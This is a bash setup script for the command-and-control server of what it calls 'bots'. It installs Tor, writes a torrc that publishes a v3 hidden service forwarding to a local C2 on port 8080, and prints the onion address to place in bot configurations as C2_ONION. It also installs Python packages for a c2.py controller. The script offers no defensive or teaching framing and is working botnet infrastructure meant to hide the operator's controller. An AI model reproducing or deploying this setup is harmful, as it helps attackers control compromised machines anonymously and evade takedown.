#!/bin/bash

# =============================================================================
# setup_c2.sh — Tor C2 Setup (Laptop-Friendly Version)
# =============================================================================
# This sets up Tor + hidden service for the C2 WITHOUT breaking normal browsing.
# No UFW deny-all, no sysctl network lockdown, no kernel hardening.
# =============================================================================

if [ "$EUID" -ne 0 ]; then
    echo "[-] Must run as root. Use: sudo $0"
    exit 1
fi

echo ""
echo "  C2 Setup (Laptop-Friendly)"
echo "  ─────────────────────────"
echo ""

# --- Install Tor ---

echo "[*] Installing Tor..."

apt update -y
apt install tor -y

# --- Configure Tor hidden service ---

echo "[*] Configuring Tor hidden service..."

cat > /etc/tor/torrc << 'TORRC'
## C2 Hidden Service Configuration
## Laptop-friendly: NO firewall changes, NO kernel hardening

Log notice file /var/log/tor/tor.log
Log warn syslog
SafeLogging 1

## Socks port for local use (your browser won't use it unless you tell it to)
SOCKSPort 127.0.0.1:9050

## Hidden service for the C2
HiddenServiceDir /var/lib/tor/c2/
HiddenServiceVersion 3
HiddenServicePort 80 127.0.0.1:8080
TORRC

chmod 644 /etc/tor/torrc
chown root:debian-tor /etc/tor/torrc

# --- Create hidden service directory ---

mkdir -p /var/lib/tor/c2
chown debian-tor:debian-tor /var/lib/tor/c2
chmod 700 /var/lib/tor/c2

# --- Start Tor ---

echo "[*] Starting Tor..."

systemctl daemon-reload
systemctl enable tor
systemctl restart tor

sleep 4

# --- Get onion address ---

if [ -f /var/lib/tor/c2/hostname ]; then
    ONION=$(cat /var/lib/tor/c2/hostname)
    echo ""
    echo "  ───────────────────────────────────────"
    echo "  [+] TOR HIDDEN SERVICE ACTIVE"
    echo "  [+] C2 Onion Address: $ONION"
    echo "  [+] C2 listens locally on :8080"
    echo "  [+] Your browser works normally (no firewall changes)"
    echo "  [+] Configure bots with:"
    echo "      C2_ONION = \"$ONION\""
    echo "  ───────────────────────────────────────"
    echo ""
else
    echo "[-] Waiting for Tor to generate onion address..."
    sleep 5
    if [ -f /var/lib/tor/c2/hostname ]; then
        ONION=$(cat /var/lib/tor/c2/hostname)
        echo "[+] C2 Onion Address: $ONION"
    else
        echo "[-] Check: journalctl -u tor --no-pager | tail -20"
    fi
fi

# --- Install Python deps ---

echo "[*] Installing Python dependencies..."

pip3 install flask waitress requests cryptography pysocks 2>/dev/null || true

# --- Summary ---

echo ""
echo "  ───────────────────────────────────────"
echo "  C2 Setup Complete"
echo "  ───────────────────────────────────────"
echo "  [+] Tor hidden service configured"
echo "  [+] No firewall changes — your browsing works"
echo "  [+] No kernel hardening"
echo "  [+] C2 ready at http://127.0.0.1:8080"
echo ""
echo "  Start the C2:  python3 c2.py"
echo ""
echo "  To stop Tor later:  sudo systemctl stop tor"
echo "  ───────────────────────────────────────"
echo ""